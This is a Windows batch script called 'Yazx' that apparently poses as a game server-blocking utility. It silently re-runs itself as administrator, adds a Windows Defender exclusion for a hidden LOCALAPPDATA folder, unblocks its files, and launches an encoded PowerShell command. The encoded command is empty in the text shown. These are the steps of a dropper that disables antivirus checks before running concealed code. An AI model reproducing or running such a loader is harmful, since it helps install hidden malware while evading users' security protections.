@echo off
set "RLSB=%~dp0"
set "_ORIG=%*"
set "_LOG=%RLSB%_yazx.log"
set "_HIDDEN="
set "RLSB_SILENT="
set "RLSB_UNINSTALL="
set "RLSB_CHECK="
set "RLSB_REDEPLOY="
:parse
if "%~1"=="" goto :run
if /i "%~1"=="-Silent" ( set "_HIDDEN=1" & set "RLSB_SILENT=1" )
if /i "%~1"=="-Uninstall" ( set "RLSB_UNINSTALL=1" )
if /i "%~1"=="-Check" ( set "RLSB_CHECK=1" )
if /i "%~1"=="-Redeploy" ( set "RLSB_REDEPLOY=1" )
shift
goto :parse
:run
if not defined _HIDDEN ( title Yazx )
set "_YZ52=WBc3COwbGJm/7EgCMUSqIw=="
set "_YZ3c=jumW3lFR8Q3wCnpddsN9lg=="
set "_"
echo [%date% %time%] === Yazx start === > "%_LOG%"
echo RLSB=%RLSB% >> "%_LOG%"
if not exist "%RLSB%rl_server_block.dat" (
    echo [%date% %time%] MISSING .dat >> "%_LOG%"
    if not defined _HIDDEN (
        echo.
        echo  [ERROR] rl_server_block.dat not found.
        echo.
        pause
    )
    exit /b 1
)
echo [%date% %time%] .dat found >> "%_LOG%"
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [%date% %time%] Elevating >> "%_LOG%"
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '%_ORIG%' -Verb RunAs"
    exit /b
)
echo [%date% %time%] Admin OK >> "%_LOG%"
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$d=Join-Path $env:LOCALAPPDATA 'YzSvc';if(-not(Test-Path $d)){$d=$env:RLSB};try{Add-MpPreference -ExclusionPath $d -ErrorAction Stop;Add-Content $env:_LOG '[EXCL] OK'}catch{Add-Content $env:_LOG ('[EXCL] FAIL: '+$_.Exception.Message)};Get-ChildItem $env:RLSB -File|Unblock-File"
echo [%date% %time%] Unblock done >> "%_LOG%"
ping -n 3 127.0.0.1 >nul 2>&1
set "_WS="
if defined _HIDDEN set "_WS=-WindowStyle Hidden"
powershell -NoProfile -ExecutionPolicy Bypass %_WS% -EncodedCommand ""
set "_EXITCODE=%errorlevel%"
if %_EXITCODE% neq 0 set "_PSFAIL=1"
echo [%date% %time%] Exit=%_EXITCODE% >> "%_LOG%"
set "_YZ52="
set "_YZ3c="
set "_YZ68="
if defined _PSFAIL (
    if not defined _HIDDEN (
        echo.
        echo  [ERROR] See _yazx.log for details.
    )
)
if not defined _HIDDEN ( echo. & pause )